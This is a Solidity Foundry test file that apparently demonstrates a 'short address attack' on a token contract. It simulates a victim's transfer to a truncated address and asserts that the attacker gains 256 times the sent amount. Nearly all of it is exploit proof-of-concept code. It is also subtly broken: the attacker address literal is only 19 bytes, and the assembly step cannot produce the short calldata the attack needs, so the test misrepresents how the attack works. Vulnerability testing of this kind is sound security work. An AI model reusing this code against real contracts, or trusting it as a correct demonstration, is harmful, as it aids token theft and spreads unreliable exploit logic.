// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/short_address_example.sol";

contract ShortAddressAttackTest is Test {
    MyToken token;
    address owner;
    address attacker;
    address victim;

    function setUp() public {
        owner = address(this);
        attacker = address(0x3bdde1e9fbaef2579dd63e2abbf0be445ab93f);
        victim = address(0x4);

        token = new MyToken();
        
        // Give victim some tokens to transfer
        token.sendCoin(victim, 1000);
    }

    function testShortAddressAttack() public {
        // Log initial balances
        console.log("--- BEFORE Normal Transfer ---");
        uint256 initialAttackerBalance = token.getBalance(attacker);
        uint256 initialVictimBalance = token.getBalance(victim);
        console.log("Attacker balance:", initialAttackerBalance);
        console.log("Victim balance:", initialVictimBalance);

        // Victim wants to send 20 tokens to attacker
        uint256 amountToSend = 20;

        // Normal transfer - should send 20 tokens
        console.log("--- Trigger Normal Transfer ---");
        vm.prank(victim);
        token.sendCoin(attacker, amountToSend);

        // Query balances after normal transfer
        console.log("--- AFTER Normal Transfer ---");
        uint256 normalTransferAttackerBalance = token.getBalance(attacker);
        uint256 normalTransferVictimBalance = token.getBalance(victim);
        uint256 attackerGainNormal = normalTransferAttackerBalance - initialAttackerBalance;
        uint256 victimLossNormal = initialVictimBalance - normalTransferVictimBalance;
        console.log("Attacker balance increase (Normal):", attackerGainNormal);
        console.log("Victim balance decrease (Normal):", victimLossNormal);

        // Reset balances
        console.log("--- Resetting Balances for Attack Test ---");
        vm.prank(victim);
        token.sendCoin(owner, token.getBalance(victim));
        vm.prank(attacker);
        token.sendCoin(owner, token.getBalance(attacker));
        vm.prank(owner);
        token.sendCoin(victim, 1000);
        console.log("Reset complete. Victim balance:", token.getBalance(victim), "Attacker balance:", token.getBalance(attacker));

        // Prepare for attack: log pre-attack balances
        console.log("--- BEFORE Attack Trigger ---");
        uint256 preAttackAttackerBalance = token.getBalance(attacker);
        uint256 preAttackVictimBalance = token.getBalance(victim);
        console.log("Attacker balance (Pre-attack):", preAttackAttackerBalance);
        console.log("Victim balance (Pre-attack):", preAttackVictimBalance);

        // Simulate short address attack
        console.log("--- Trigger Short Address Attack ---");
        bytes memory shortAddress = abi.encodePacked(bytes19(0x3bdde1e9fbaef2579dd63e2abbf0be445ab93f));
        address shortAddr;
        assembly {
            shortAddr := mload(add(shortAddress, 20))
        }

        // Victim sends to short address
        vm.prank(victim);
        token.sendCoin(shortAddr, amountToSend);

        // Query post-attack balances
        console.log("--- AFTER Attack Trigger ---");
        uint256 postAttackAttackerBalance = token.getBalance(attacker);
        uint256 postAttackVictimBalance = token.getBalance(victim);
        uint256 attackerGainAttack = postAttackAttackerBalance - preAttackAttackerBalance;
        uint256 victimLossAttack = preAttackVictimBalance - postAttackVictimBalance;
        console.log("Attacker balance increase (Attack):", attackerGainAttack);
        console.log("Victim balance decrease (Attack):", victimLossAttack);

        // Compare results
        bool isVulnerable = false;
        string memory reason;

        if (attackerGainAttack == attackerGainNormal * 256) {
            isVulnerable = true;
            reason = "Attacker gained 256x more tokens than normal transfer";
        } else {
            reason = "Balance changes did not match expected 256x multiplier";
        }

        // Final verdict
        console.log("Test Result Comparison:");
        console.log("- Normal transfer delta: +%d (attacker), -%d (victim)", 
            attackerGainNormal, victimLossNormal);
        console.log("- Attack transfer delta: +%d (attacker), -%d (victim)", 
            attackerGainAttack, victimLossAttack);
        
        if (isVulnerable) {
            console.log("Vulnerability Exists:", reason);
        } else {
            console.log("Vulnerability not Exist:", reason);
        }

        // Add assertion to maintain original test logic
        assertEq(
            attackerGainAttack,
            attackerGainNormal * 256,
            "Short address attack transferred 256x more tokens"
        );
    }
}